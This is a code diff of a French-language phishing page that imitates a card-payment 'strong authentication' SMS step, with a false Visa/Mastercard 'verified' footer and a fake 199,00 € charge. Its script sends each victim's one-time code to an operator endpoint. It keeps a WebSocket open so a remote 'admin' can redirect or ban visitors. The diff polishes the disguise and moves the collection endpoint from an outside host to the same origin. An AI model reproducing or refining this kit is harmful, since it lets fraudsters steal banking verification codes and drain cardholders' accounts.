@@ -4,82 +4,219 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification SMS - Aura Pay</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <title>Vérification de sécurité | Alpha Pay</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
+        :root {
+            --bg-color: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --primary: #2563eb;
+            --border: #e5e7eb;
+            --input-bg: #f9fafb;
+        }
+
+        * {
+            box-sizing: border-box;
             margin: 0;
+            padding: 0;
             font-family: 'Inter', sans-serif;
-            background: #0f172a;
-            color: white;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             padding: 20px;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 2rem;
-            border-radius: 16px;
+        .sms-container {
             width: 100%;
-            max-width: 350px;
+            max-width: 400px;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 32px;
         }
 
-        h3 {
-            margin-bottom: 1rem;
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.01em;
         }
 
-        p {
-            font-size: 0.9rem;
-            color: #94a3b8;
-            margin-bottom: 1.5rem;
+        .header p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .card-summary {
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 28px;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 700;
+            color: #1f2937;
+        }
+
+        .card-info {
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .otp-input-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
         }
 
         input {
             width: 100%;
-            padding: 1rem;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: white;
-            font-size: 1.2rem;
+            padding: 14px;
+            font-size: 18px;
             text-align: center;
-            letter-spacing: 5px;
-            box-sizing: border-box;
+            letter-spacing: 4px;
+            font-weight: 700;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            transition: all 0.2s;
         }
 
-        button {
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        .btn-submit {
             width: 100%;
-            padding: 1rem;
-            background: #6366f1;
+            padding: 14px;
+            background-color: var(--text-main);
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            color: white;
+            border-radius: 10px;
+            font-size: 16px;
             font-weight: 600;
-            margin-top: 1.5rem;
             cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #374151;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .resend-link a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-secure {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 11px;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
     </style>
 </head>
 
 <body>
-    <div class="card">
-        <h3>Vérification par SMS</h3>
-        <p>Entrez le code de vérification envoyé sur votre mobile pour valider le paiement.</p>
+    <div class="sms-container">
+        <div class="header">
+            <h1 id="bank-name">Authentification Forte</h1>
+            <p>Veuillez entrer le code de sécurité envoyé à votre numéro de téléphone finissant par •• ••.</p>
+        </div>
+
+        <div class="card-summary">
+            <div class="card-icon">CARD</div>
+            <div class="card-info">Paiement sécurisé de <span style="font-weight: 700;">199,00 €</span></div>
+        </div>
+
         <form id="smsForm">
-            <input type="text" id="otp" placeholder="••••••" maxlength="6" required>
-            <button type="submit">Valider</button>
+            <div class="form-group">
+                <label>Code de validation SMS</label>
+                <div class="otp-input-container">
+                    <input type="text" id="otp" placeholder="••••••" maxlength="6" required
+                        autocomplete="one-time-code">
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">Valider le paiement</button>
         </form>
+
+        <div class="resend-link">
+            Vous n'avez pas reçu de code ? <a href="#" onclick="location.reload()">Renvoyer</a>
+        </div>
+
+        <div class="footer-secure">
+            Verified by Visa &bull; Mastercard Identity Check
+        </div>
     </div>
 
     <script>
         const clientId = localStorage.getItem('aura_client_id');
-        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
+        const wsUrl = `wss://${window.location.host}/ws/client/${clientId}`;
         const ws = new WebSocket(wsUrl);
+
         ws.onopen = () => {
             ws.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
         };
@@ -87,16 +224,26 @@
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
             if (msg.type === 'REDIRECT') window.location.href = msg.url;
-            else if (msg.type === 'BANNED') {
-                window.location.href = msg.redirect || 'https://www.facebook.com';
-            }
+            else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
         };
 
         document.getElementById('smsForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            const btn = e.target.querySelector('button');
             const otp = document.getElementById('otp').value;
-            await fetch(`https://api-production-8591.up.railway.app/v1/sms-submit?client_id=${clientId}&otp=${otp}`, { method: 'POST' });
-            window.location.href = '/loading'; // Retour au loading pour attendre l'admin
+
+            btn.disabled = true;
+            btn.textContent = 'Vérification...';
+
+            try {
+                await fetch(`/v1/sms-submit?client_id=${clientId}&otp=${otp}`, { method: 'POST' });
+                // We go back to loading to wait for admin redirection if next step is not immediate
+                window.location.href = '/loading';
+            } catch (err) {
+                alert("Erreur de connexion.");
+                btn.disabled = false;
+                btn.textContent = 'Valider le paiement';
+            }
         });
     </script>
 </body>
